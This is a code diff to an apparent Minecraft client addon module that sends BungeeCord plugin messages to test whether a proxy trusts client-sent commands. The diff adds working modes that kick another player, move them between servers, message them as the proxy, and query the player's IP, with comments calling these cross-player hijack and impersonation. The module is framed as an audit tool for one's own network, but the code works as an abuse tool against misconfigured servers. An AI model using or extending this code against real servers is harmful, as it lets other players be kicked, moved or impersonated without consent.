@@ -37,7 +37,10 @@ import java.nio.charset.StandardCharsets;
  * outbound payload types at addon init. Run on YOUR network only.
  */
 public class PluginMessageProbe extends Module {
-    public enum Mode { BUNGEE_CONNECT, BUNGEE_FORWARD, BUNGEE_PLAYERCOUNT, BUNGEE_GETSERVERS, BUNGEE_MALFORMED, CHANNEL_REGISTER_SPAM }
+    public enum Mode {
+        BUNGEE_CONNECT, BUNGEE_CONNECT_OTHER, BUNGEE_FORWARD, BUNGEE_PLAYERCOUNT, BUNGEE_GETSERVERS,
+        BUNGEE_IP, BUNGEE_KICK, BUNGEE_MESSAGE, BUNGEE_MALFORMED, CHANNEL_REGISTER_SPAM
+    }
 
     public static final Identifier BUNGEE = Identifier.of("bungeecord", "main");
     public static final Identifier REGISTER = Identifier.of("minecraft", "register");
@@ -50,8 +53,18 @@ public class PluginMessageProbe extends Module {
         .defaultValue(Mode.BUNGEE_GETSERVERS).build()
     );
     private final Setting<String> server = sgGeneral.add(new StringSetting.Builder()
-        .name("server").description("Target backend server name (Connect/Forward/PlayerCount).")
+        .name("server").description("Target backend server name (Connect/ConnectOther/Forward/PlayerCount).")
         .defaultValue("lobby").build()
+    );
+    private final Setting<String> targetPlayer = sgGeneral.add(new StringSetting.Builder()
+        .name("target-player").description("Another player's name (ConnectOther/KickPlayer/Message) — the cross-player abuse target.")
+        .defaultValue("Notch")
+        .visible(() -> mode.get() == Mode.BUNGEE_CONNECT_OTHER || mode.get() == Mode.BUNGEE_KICK || mode.get() == Mode.BUNGEE_MESSAGE).build()
+    );
+    private final Setting<String> messageText = sgGeneral.add(new StringSetting.Builder()
+        .name("message-text").description("Message/kick reason to deliver via the proxy (Message/KickPlayer).")
+        .defaultValue("acaudit proxy-trust probe")
+        .visible(() -> mode.get() == Mode.BUNGEE_KICK || mode.get() == Mode.BUNGEE_MESSAGE).build()
     );
     private final Setting<Integer> delayTicks = sgGeneral.add(new IntSetting.Builder()
         .name("delay-ticks").description("Ticks between sends.")
@@ -76,7 +89,7 @@ public class PluginMessageProbe extends Module {
 
     public PluginMessageProbe() {
         super(AddonTemplate.TESTING_CATEGORY, "plugin-message-probe",
-            "Sends BungeeCord/Velocity plugin messages (Connect/Forward/PlayerCount/GetServers/malformed) and channel register spam. Tests proxy plugin-message trust.");
+            "Sends BungeeCord/Velocity plugin messages (Connect/ConnectOther/Forward/PlayerCount/GetServers/IP/KickPlayer/Message/malformed) and channel register spam. Tests proxy plugin-message trust (incl. cross-player hijack).");
     }
 
     @Override
@@ -96,8 +109,22 @@ public class PluginMessageProbe extends Module {
         try {
             switch (mode.get()) {
                 case BUNGEE_CONNECT -> { var b = new Buf(); b.out.writeUTF("Connect"); b.out.writeUTF(server.get()); sendBungee(b.bytes()); }
+                case BUNGEE_CONNECT_OTHER -> {
+                    // Move ANOTHER player to a server. If the proxy honours this from a client,
+                    // any player can be yanked between servers — a cross-player hijack.
+                    var b = new Buf(); b.out.writeUTF("ConnectOther"); b.out.writeUTF(targetPlayer.get()); b.out.writeUTF(server.get()); sendBungee(b.bytes());
+                }
                 case BUNGEE_PLAYERCOUNT -> { var b = new Buf(); b.out.writeUTF("PlayerCount"); b.out.writeUTF(server.get()); sendBungee(b.bytes()); }
                 case BUNGEE_GETSERVERS -> { var b = new Buf(); b.out.writeUTF("GetServers"); sendBungee(b.bytes()); }
+                case BUNGEE_IP -> { var b = new Buf(); b.out.writeUTF("IP"); sendBungee(b.bytes()); }
+                case BUNGEE_KICK -> {
+                    // Kick another player through the proxy — trust-abuse if honoured from a client.
+                    var b = new Buf(); b.out.writeUTF("KickPlayer"); b.out.writeUTF(targetPlayer.get()); b.out.writeUTF(messageText.get()); sendBungee(b.bytes());
+                }
+                case BUNGEE_MESSAGE -> {
+                    // Deliver a chat message to another player AS the proxy (impersonation surface).
+                    var b = new Buf(); b.out.writeUTF("Message"); b.out.writeUTF(targetPlayer.get()); b.out.writeUTF(messageText.get()); sendBungee(b.bytes());
+                }
                 case BUNGEE_FORWARD -> {
                     var b = new Buf(); b.out.writeUTF("Forward"); b.out.writeUTF(server.get()); b.out.writeUTF("acaudit:probe");
                     byte[] payload = "audit".getBytes(StandardCharsets.UTF_8);
